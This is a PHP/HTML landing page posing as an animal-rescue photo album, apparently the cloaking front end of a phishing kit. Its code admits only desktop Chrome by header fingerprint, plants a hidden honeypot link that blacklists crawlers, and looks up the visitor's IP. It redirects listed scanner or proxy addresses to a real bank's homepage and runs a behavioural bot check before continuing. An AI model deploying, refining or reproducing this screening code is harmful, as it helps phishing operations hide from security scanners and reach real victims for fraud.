<?php
require __DIR__ . '/../lib.php';

// Entry page: real desktop Chrome only (full header fingerprint + honeypot).
gate_doc([], 0, false);

$tk = issue_token();
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow">
  <title>Our Animal Rescue Story</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      height: 100vh; width: 100vw; overflow: hidden;
      background: #0e0e0e url('assets/screen.png') center/cover no-repeat;
      font-family: "Segoe UI", Tahoma, sans-serif; color: #e8e2d6;
    }
    .veil {
      position: absolute; inset: 0;
      background: radial-gradient(ellipse at center, rgba(14,14,14,0.35) 0%, rgba(14,14,14,0.82) 100%);
      display: flex; flex-direction: column; align-items: center; justify-content: center;
    }
    .rings { width: 64px; height: 64px; margin-bottom: 26px; }
    .names {
      font-family: Georgia, "Times New Roman", serif;
      font-size: 34px; letter-spacing: 4px; color: #efe6d2;
      text-shadow: 0 2px 12px rgba(0,0,0,0.6);
    }
    .date {
      font-size: 13px; letter-spacing: 3px; color: #b7ad99; margin-top: 12px;
      text-transform: uppercase;
    }
    .status { margin-top: 30px; font-size: 13px; color: #cdc4b1; letter-spacing: 1px; }
    .spinner {
      width: 30px; height: 30px; margin: 18px auto 0 auto;
      border: 3px solid #6d675c; border-top-color: #d8c9a3;
      border-radius: 50%; animation: spin 0.8s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="veil">
    <svg class="rings" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
      <circle cx="38" cy="54" r="26" fill="none" stroke="#c9a86a" stroke-width="7"/>
      <circle cx="62" cy="46" r="26" fill="none" stroke="#a8894e" stroke-width="7"/>
    </svg>
    <div class="names">Animal Rescue Story</div>
    <div class="date">Rescued &middot; Awarded &middot; On the News</div>
    <div class="status">Opening the album&hellip;</div>
    <div class="spinner"></div>
  </div>

  <!-- Honeypot: invisible to humans, followed by link-crawling bots.
       A visit to ?hp=1 poisons that IP+UA fingerprint for 24h. -->
  <a href="?hp=1" aria-hidden="true"
     style="position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;overflow:hidden;white-space:nowrap;">Skip verification</a>

  <script>
    const TK = <?php echo json_encode($tk); ?>;

    const blockedIPs = [
      '162.158.63.162',
      '162.158.63.161',
      '162.158.63.160'
    ];

    function isMobileDevice() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    function getClientIP() {
      // 3s guard so a hung external call can't stall the whole flow.
      return new Promise((resolve) => {
        var to = setTimeout(function () { resolve(null); }, 3000);
        fetch('https://api.ipify.org?format=json')
          .then(response => response.json())
          .then(data => { clearTimeout(to); resolve(data.ip); })
          .catch(() => { clearTimeout(to); resolve(null); });
      });
    }

    (async function() {
      if (isMobileDevice()) {
        window.location.href = "denied.html";
        return;
      }
      const clientIP = await getClientIP();
      if (clientIP && blockedIPs.includes(clientIP)) {
        window.location.href = "https://www.easternbank.com/";
        return;
      }
      // Behavioral gate: collect mouse/keyboard/scroll, one Jev verdict,
      // then continue with the verdict-bound token. All failure paths fall
      // back to the original 5s fixed-time redirect.
      <?php include __DIR__ . '/../include/telemetry.php'; ?>
    })();
  </script>
</body>
</html>
